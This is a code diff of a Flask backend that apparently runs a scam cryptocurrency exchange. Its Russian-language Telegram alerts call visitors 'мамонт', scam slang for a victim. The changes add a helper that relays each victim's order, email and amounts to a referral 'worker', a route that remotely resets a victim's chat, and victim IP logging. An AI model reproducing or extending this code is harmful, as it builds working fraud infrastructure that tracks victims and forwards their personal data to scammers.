@@ -52,6 +52,13 @@ def send_message():
     return {"status": "message sent"}
 
 
+@app.route("/rollchat", methods=["POST"])
+def rollChat():
+    userId = request.json.get("userId")
+    socketio.emit(f"rollchat_{userId}")
+    return {"status": "chat rolled"}
+
+
 # @app.route("/send-error", methods=["POST"])
 # def send_error():
 #    transID = request.json.get("transID")
@@ -160,18 +167,16 @@ def getUser(id):
             # [{"text": "Удалить ТП", "callback_data": f"uans_{id}"}]
         ]
     }
-
-    if str(id).isdigit() and len(str(id)) == 8:
+    print(db_api.checkUser(id))
+    if str(id).isdigit() and len(str(id)) == 8 and db_api.checkUser(id) != None:
         chatbanned = db_api.checkForBan(id)
         send_telegram_message(telegram_message, inline_keyboard)
-        # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId,}), headers=headers)
         return jsonify(id=int(id), chatbanned=chatbanned)
     else:
         chatbanned = "0"
         id = db_api.getId()
         db_api.registerUser(id, user_ip, online, chatbanned)
-        send_telegram_message(telegram_message, inline_keyboard)
-        # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId,'text': f'мамонт перешел на сайт \n IP:[{user_ip}]\n ID:[{id}]'}), headers=headers)
+        # send_telegram_message(telegram_message, inline_keyboard)
         return jsonify(id=id, chatbanned=chatbanned)
 
 
@@ -255,13 +260,8 @@ def confirm(orderId):
         receiveAmount = float(receiveAmount)
         receiveAmount = format(receiveAmount, "f")
     if db_api.checkRefIfValid(referalCode) == True:
-        usid = db_api.getUserId(referalCode)
+        send_tg_message_to_slave(telegram_message, referalCode)
         send_telegram_message(telegram_message, inline_keyboard)
-        requests.post(
-            tgbotUrl,
-            data=json.dumps({**telegram_message, "chat_id": usid}),
-            headers={"Content-Type": "application/json"},
-        )
         # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId}), headers=headers)
     else:
         send_telegram_message(telegram_message, inline_keyboard)
@@ -406,15 +406,9 @@ def newOrder(
     }
     if db_api.checkRefIfValid(referalCode) == True:
         payload = f"🤑 Мамонт создал заявку\nРефка: <code>{referalCode}</code>\n\n{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}"
-        refpayload = f"🤑 Мамонт создал заявку по твоей рефке: {referalCode}\n\n{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}"
-        usid = db_api.getUserId(referalCode)
-        # id2 = adminId
-        response = requests.post(
-            tgbotUrl,
-            data=json.dumps({{**payload, "chat_id": usid, "parse_mode": html}}),
-            headers=headers,
-        )
+        refmsg = f"🤑 Мамонт создал заявку по твоей рефке: <code>{referalCode}</code>\n\n<b>{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}</b>\n{email}\nstatus:<b>{status}</b>"
         # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id2}), headers=headers)
+        send_tg_message_to_slave(refmsg, referalCode)
         send_telegram_message(payload, inline_keyboard)
     elif db_api.checkRefIfValid(referalCode) == False:
         payload = f"🤑 Мамонт создал заявку без рефки\n\n\n{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}"
@@ -438,6 +432,25 @@ def newOrder(
     # else:
     #    print('Failed to send message. Error:', response.text)
     return jsonify(orderId=orderIdd)
+
+
+def send_tg_message_to_slave(message, referalCode):
+    headers = {"Content-Type": "application/json"}
+    telegram_api_url = tgbotUrl
+    usid = db_api.getUserId(referalCode)
+    # id2 = adminId
+    refpayload = {
+        "chat_id": usid,
+        "text": message,
+        "parse_mode": "html",
+    }
+    response = requests.post(
+        telegram_api_url, data=json.dumps(refpayload), headers=headers
+    )
+    if response.status_code == 200:
+        print("Message sent successfully.")
+    else:
+        print("Failed to send message. Error:", response.text)
 
 
 def send_telegram_message(message, inline_keyboard):
@@ -469,8 +482,5 @@ def address_generator(size=6, chars=string.ascii_uppercase + string.digits):
 
 
 if __name__ == "__main__":
-    # socketio.run(app, host="127.0.0.1", port=5000, debug=True)
-    # app.run()
-    # from waitress import serve
-    # serve(app, host="127.0.0.1", port=5000)
-    eventlet.wsgi.server(eventlet.listen(("127.0.0.1", 5000)), app)
+    socketio.run(app, host="127.0.0.1", port=5000, debug=True)
+    # eventlet.wsgi.server(eventlet.listen(("127.0.0.1", 5000)), app)
